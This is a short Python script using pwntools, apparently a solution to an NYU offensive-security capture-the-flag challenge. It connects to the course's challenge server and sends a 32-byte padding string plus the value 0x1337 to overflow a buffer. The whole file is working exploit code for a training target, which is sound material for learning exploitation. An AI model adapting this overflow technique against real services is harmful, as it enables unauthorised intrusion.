from pwn import *

s = connect("offsec-chalbroker.osiris.cyber.nyu.edu", 9090)

print(s.recv(1024))
sploit = 'a'*32 + p32(0x1337)
#print(sploit)
s.sendline(sploit)
print(s.recv(1024))
